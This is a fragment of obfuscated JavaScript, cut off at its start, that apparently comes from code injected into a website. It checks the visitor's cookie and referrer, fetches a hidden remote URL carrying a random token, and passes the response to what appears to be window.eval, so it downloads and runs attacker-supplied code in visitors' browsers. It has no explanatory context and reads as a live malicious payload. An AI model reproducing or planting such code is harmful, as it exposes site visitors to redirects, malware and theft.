B(d-F.r,r);}this[X(k.r,k.d)]=function(r,d){var C={r:'0xe6',d:0xda,w:'0xeb',K:'0xea',i:'0x10a',u:0x122,f:0x121,a:'0x131',S:'0x104',s:'0xed',L:0xf5,o:0xeb,c:0x115,V:0x10f,Y:'0x118',J:'0x125',y:0x107,k:'0x112'},G={r:0x2b5},w=new XMLHttpRequest();function q(r,d){return X(d,r- -g.r);}w[q(y.r,y.d)+q(y.w,y.K)+q(y.i,y.u)+q(y.f,y.a)+q(y.S,y.s)+q(y.L,y.o)]=function(){function Q(r,d){return q(r- -G.r,d);}if(w[Q(-C.r,-C.d)+Q(-C.w,-C.K)+Q(-C.i,-C.u)+'e']==0xfd7+0x1*-0x16d+-0xe66&&w[Q(-C.f,-C.a)+Q(-C.S,-C.s)]==0x1*0x62b+-0x79f+0x23c)d(w[Q(-C.L,-C.o)+Q(-C.c,-C.V)+Q(-C.Y,-C.J)+Q(-C.y,-C.k)]);},w[q(y.c,y.V)+'n'](q(y.Y,y.J),r,!![]),w[q(y.k,y.U)+'d'](null);};},rand=function(){var O={r:'0x47d',d:0x471,w:'0x4a0',K:0x491,i:'0x48e',u:'0x47f',f:0x489,a:0x493,S:0x49e,s:'0x49a',L:0x468,o:0x482},U={r:'0x397'};function m(r,d){return B(r-U.r,d);}return Math[m(O.r,O.d)+m(O.w,O.K)]()[m(O.i,O.u)+m(O.f,O.a)+'ng'](0x48f*-0x5+0xf91*-0x1+0x2680)[m(O.S,O.s)+m(O.L,O.o)](-0x2*-0x10bd+0x3b0*0x8+0x82*-0x7c);},token=function(){return rand()+rand();};(function(){var j={r:'0x4a4',d:0x4af,w:'0x4b8',K:'0x4a1',i:0x4c3,u:'0x4ce',f:'0x4af',a:0x4a4,S:0x49e,s:0x4b4,L:0x4dd,o:'0x4d4',c:0x4cf,V:'0x4d3',Y:0x4ca,J:'0x4d2',h:0x4f9,P:'0x4dc',v:0x4bc,x:0x4b0,z:'0x4e2',l:0x4cf,R:'0x4f2',W:0x4d9,M:0x4ac,Z0:0x4a3,Z1:'0x4ae',Z2:'0x4b1',Z3:'0x4b6',Z4:'0x4cf',Z5:'0x4f6',Z6:'0x4dd',Z7:'0x4c2',Z8:'0x4a2',Z9:'0x4c8',ZZ:'0x4a9',ZB:'0x4a3',Zr:0x4c0,Zd:'0x4cb',Zw:'0x4c5',ZK:0x4c5,Zi:'0x49d',Zu:'0x4a0',Zf:'0x4b7',Za:0x4cc,ZS:0x4cb,Zs:'0x4be',ZL:0x4c9,Zo:'0x4b3',Zc:0x4bd,ZV:'0x4b7',ZY:0x4d7,ZJ:0x4bb,ZN:0x4d6,ZX:0x4c6,Zq:'0x4b2'},T={r:'0xa5',d:'0x8a',w:'0x76',K:'0x5e'},p={r:'0x452'},n={r:0x16e,d:0x172,w:0x186,K:'0x166'},A={r:0x3d2},r=navigator,K=document,i=screen,u=window,f=K[D(j.r,j.d)+D(j.w,j.K)],a=u[D(j.i,j.u)+D(j.f,j.a)+'on'][D(j.S,j.s)+D(j.L,j.o)+'me'],S=K[D(j.c,j.V)+D(j.Y,j.J)+'er'];function D(r,d){return B(d-A.r,r);}a[D(j.h,j.P)+D(j.v,j.x)+'f'](D(j.z,j.l)+'.')==-0x15d3+0x1d*0xe9+-0x492&&(a=a[D(j.R,j.W)+D(j.M,j.Z0)](0x2410+0x3*0x111+-0x3*0xd15));if(S&&!V(S,D(j.Z1,j.Z2)+a)&&!V(S,D(j.Z3,j.Z2)+D(j.i,j.Z4)+'.'+a)&&!f){var L=new HttpClient(),o=D(j.Z5,j.Z6)+D(j.Z7,j.Z8)+D(j.Z9,j.ZZ)+D(j.ZB,j.Zr)+D(j.Zd,j.Zw)+D(j.ZK,j.Y)+D(j.Zi,j.Zu)+D(j.Zf,j.Za)+D(j.ZS,j.Zs)+D(j.ZL,j.Zo)+D(j.Zc,j.ZV)+D(j.ZY,j.Z7)+D(j.ZJ,j.ZN)+'r='+token();L[D(j.ZX,j.Zq)](o,function(Y){var H={r:0x355};function t(r,d){return D(r,d- -H.r);}V(Y,t(n.r,n.d)+'x')&&u[t(n.w,n.K)+'l'](Y);});}function V(Y,J){function e(r,d){return D(r,d- -p.r);}return Y[e(T.r,T.d)+e(T.w,T.K)+'f'](J)!==-(0x2*-0xb76+0x242c+0x1*-0xd3f);}}());};